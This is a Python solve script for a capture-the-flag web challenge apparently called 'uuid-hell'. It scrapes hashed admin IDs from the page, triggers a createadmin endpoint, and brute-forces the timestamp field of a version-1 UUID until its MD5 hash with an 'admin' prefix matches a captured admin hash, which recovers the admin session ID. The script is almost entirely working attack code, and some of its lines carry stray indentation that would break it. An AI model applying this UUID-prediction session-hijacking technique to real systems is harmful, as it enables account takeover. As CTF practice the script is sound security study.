import requests
import hashlib

 URL = "https://uuid-hell.lac.tf/"
 session = requests.Session()

 resp = requests.get(URL)

 first_id = resp.cookies["id"]
 print(resp.cookies["id"])
 offset = resp.text.index("<strong>Admin users:</strong>") + len(
     "<strong>Admin users:</strong>"
)
response_text = (
    resp.text[offset : resp.text.index("<strong>Regular users:</strong>")]
    .replace("<tr><td>", "")
    .replace("</td></tr>", "")
)

print("response text", response_text)


# smthing like that
x = response_text.split("\n")
print(x)

resp = requests.post(URL + "createadmin")

print(resp.text)
print(resp)

resp = requests.get(URL)

second_id = resp.cookies["id"]
response_text = (
    resp.text[offset : resp.text.index("<strong>Regular users:</strong>")]
    .replace("<tr><td>", "")
    .replace("</td></tr>", "")
)

y = response_text.split("\n")
print(y)

original = []


for ele1 in y:
    if not ele1 in x:
        original.append(ele1)
        print(f"[+] original: ",original)


# # Compute the intervals from second_id to first_id with comparing to the hashed id
# # 836d28b2-7592-11e9-8201-bb2f15014a14`
# # 836d28b2 represents the timestamp with some calculation done on it ( but it increments tho with one)
# # the rest is the same because it uuid v1
# # ref: https://versprite.com/blog/universally-unique-identifiers/

print("second_id", second_id)
print("first_id", first_id)
print("original", original)


def compare_hashedadmin(uuid, original):
    result = hashlib.md5(b"admin" + uuid.encode("utf-8"))
    # print("hash result ",result.hexdigest())
    return result.hexdigest() == original


# -aaf3-11ed-aa64-67696e6b6f69
# -aaf3-11ed-aa64-67696e6b6f69
second_id="eaa10770"
first_id="e9f1dbb0"
original='376d616cb3814206c15a6ee55eed645f'

print(int(second_id, 16))
print(int(first_id,16)-int(second_id, 16))
for i in range(int(first_id, 16), int(second_id, 16)):
    print(hex(i)[2:])
    print("[+] trying",hex(i)[2:]+"-aaf3-11ed-aa64-67696e6b6f69")
    if compare_hashedadmin(hex(i)[2:]+"-aaf3-11ed-aa64-67696e6b6f69", original):
        print("found")
        break